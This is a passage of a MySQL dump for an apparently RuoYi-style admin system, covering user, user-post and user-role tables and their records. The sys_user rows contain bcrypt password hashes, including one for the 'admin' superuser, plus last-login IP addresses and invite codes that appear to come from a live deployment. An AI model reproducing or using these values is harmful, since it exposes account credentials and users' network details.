  `del_flag` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '0' COMMENT '删除标志（0代表存在 2代表删除）',
  `login_ip` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '最后登录IP',
  `login_date` datetime(0) NULL DEFAULT NULL COMMENT '最后登录时间',
  `create_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '创建者',
  `create_time` datetime(0) NULL DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '更新者',
  `update_time` datetime(0) NULL DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '备注',
  `invtiecode` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '邀请码',
  PRIMARY KEY (`user_id`) USING BTREE,
  UNIQUE INDEX `invtiecode`(`invtiecode`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 134 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '用户信息表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_user
-- ----------------------------
INSERT INTO `sys_user` VALUES (1, 100, 'admin', '超级管理员', '00', 'ry@163.com', '15888888888', '1', '', '$2a$10$AODPZi8G08sdFpEoyVTdbuYosB69EdqgWfsFvbHfoUp434vwOcWaG', '0', '0', '112.96.230.94', '2022-09-15 10:10:11', 'admin', '2022-02-27 01:06:22', '', '2022-09-15 10:10:11', '管理员', 'a');
INSERT INTO `sys_user` VALUES (109, 202, 'admin1', '董事长', '00', '', '', '0', '', '$2a$10$nRjiyVUhShrtsekoMqfoaONOLI5ML0ALbeYGvYm8SRFItMxG6U0.a', '0', '0', '61.224.75.142', '2022-09-14 19:33:24', 'admin', '2022-03-22 08:04:49', 'admin', '2022-09-14 19:33:24', NULL, 'WQEOAW');
INSERT INTO `sys_user` VALUES (124, 202, '10001', '10001', '00', '', '', '0', '', '$2a$10$.VcMqVKOzZRffm8/j3Yp7O2xMkGquqYEJnaXuT1Up3GDJvMrt2aDC', '0', '0', '127.0.0.1', '2022-05-04 01:35:50', 'admin', '2022-03-25 01:06:00', 'admin', '2022-05-04 01:35:50', NULL, '8D2I1J');
INSERT INTO `sys_user` VALUES (125, 202, '10002', '10002', '00', '', '', '0', '', '$2a$10$A0KgdnLG/pUK..OpvDEbQ.kuZk5PU2SM7wzZ1eKP4AXu9647aGKom', '0', '0', '', NULL, 'admin', '2022-03-25 01:06:21', '', NULL, NULL, '8fCSTY');
INSERT INTO `sys_user` VALUES (126, 202, '10003', '10003', '00', '', '', '0', '', '$2a$10$oAzmVbJLFHHk/VmHrW5tHOOmrs9Cq1gs4pGhUxhT2.hc5awSXClfG', '0', '0', '', NULL, 'admin', '2022-03-25 01:06:41', '', NULL, NULL, '8R1HBF');
INSERT INTO `sys_user` VALUES (127, 202, '10004', '10004', '00', '', '', '0', '', '$2a$10$iZLCrzBe/5mmvvsDn5mg5eJxf9qnAHMslQBlftwJOMh2JhVmIEeWm', '0', '0', '203.160.80.57, 162.158.178.164', '2022-03-25 10:51:16', 'admin', '2022-03-25 01:06:57', '', '2022-03-25 02:51:15', NULL, '840MXD');
INSERT INTO `sys_user` VALUES (128, 202, '10005', '10005', '00', '', '', '0', '', '$2a$10$Ib0Xv1UfHcw35FOfQr0xx.kB9fxNWDlPaZVkfFX/m5mBzcdEMfPpO', '0', '0', '', NULL, 'admin', '2022-03-25 01:07:14', '', NULL, NULL, '8VPR3A');
INSERT INTO `sys_user` VALUES (129, 202, '10006', '10006', '00', '', '', '0', '', '$2a$10$jyYKodpjJcRBr2.aolOJQOC2FknmQeCfb5fELZ6svDRXyXjdRLtF.', '0', '0', '', NULL, 'admin', '2022-03-25 01:07:29', 'admin', '2022-03-25 01:08:33', NULL, '8YFJJQ');
INSERT INTO `sys_user` VALUES (130, 202, '10007', '10007', '00', '', '', '0', '', '$2a$10$xVMqGG9lhgZGx.rbIQlRm.c7KBB52dISLrm5wlekTgqCgsskKiB32', '0', '0', '', NULL, 'admin', '2022-03-25 01:07:45', 'admin', '2022-03-25 01:08:45', NULL, '8LCSGS');
INSERT INTO `sys_user` VALUES (131, 202, '10008', '10008', '00', '', '', '0', '', '$2a$10$ZLfA6F9DAPex.gpzdP.fFewvLhZwN0HWq0u1/W1lIY.7GRunY70CO', '0', '0', '', NULL, 'admin', '2022-03-25 01:08:06', '', NULL, NULL, '8TCA56');
INSERT INTO `sys_user` VALUES (132, 202, '10009', '10009', '00', '', '', '0', '', '$2a$10$WOCxbco.Cm1iUtyBjlqrkOY7TFaG5vs1YnEMxan.ygI7fpnGtGKQG', '0', '0', '', NULL, 'admin', '2022-03-25 01:08:23', '', NULL, NULL, '8NA5GC');
INSERT INTO `sys_user` VALUES (133, 202, '10010', '10010', '00', '', '', '0', '', '$2a$10$y0rzy8tvDFfD88aj7Swq4OWuqBXlwLlBDtr5NKFNaMRZohzFwUxwO', '0', '0', '', NULL, 'admin', '2022-03-25 01:09:09', '', NULL, NULL, '86JCNX');

-- ----------------------------
-- Table structure for sys_user_post
-- ----------------------------
DROP TABLE IF EXISTS `sys_user_post`;
CREATE TABLE `sys_user_post`  (
  `user_id` bigint(20) NOT NULL COMMENT '用户ID',
  `post_id` bigint(20) NOT NULL COMMENT '岗位ID',
  PRIMARY KEY (`user_id`, `post_id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '用户与岗位关联表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_user_post
-- ----------------------------
INSERT INTO `sys_user_post` VALUES (1, 1);

-- ----------------------------
-- Table structure for sys_user_role
-- ----------------------------
DROP TABLE IF EXISTS `sys_user_role`;
CREATE TABLE `sys_user_role`  (
  `user_id` bigint(20) NOT NULL COMMENT '用户ID',
  `role_id` bigint(20) NOT NULL COMMENT '角色ID',
  PRIMARY KEY (`user_id`, `role_id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '用户和角色关联表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_user_role
-- ----------------------------
INSERT INTO `sys_user_role` VALUES (1, 1);
INSERT INTO `sys_user_role` VALUES (109, 100);
INSERT INTO `sys_user_role` VALUES (109, 101);
INSERT INTO `sys_user_role` VALUES (119, 101);
INSERT INTO `sys_user_role` VALUES (120, 101);
INSERT INTO `sys_user_role` VALUES (121, 100);
INSERT INTO `sys_user_role` VALUES (121, 101);
INSERT INTO `sys_user_role` VALUES (122, 100);
INSERT INTO `sys_user_role` VALUES (122, 101);
INSERT INTO `sys_user_role` VALUES (124, 101);
INSERT INTO `sys_user_role` VALUES (125, 101);
INSERT INTO `sys_user_role` VALUES (126, 101);
INSERT INTO `sys_user_role` VALUES (127, 101);
INSERT INTO `sys_user_role` VALUES (128, 101);
INSERT INTO `sys_user_role` VALUES (129, 101);
INSERT INTO `sys_user_role` VALUES (130, 101);
INSERT INTO `sys_user_role` VALUES (131, 101);
INSERT INTO `sys_user_role` VALUES (132, 101);
INSERT INTO `sys_user_role` VALUES (133, 101);

SET FOREIGN_KEY_CHECKS = 1;
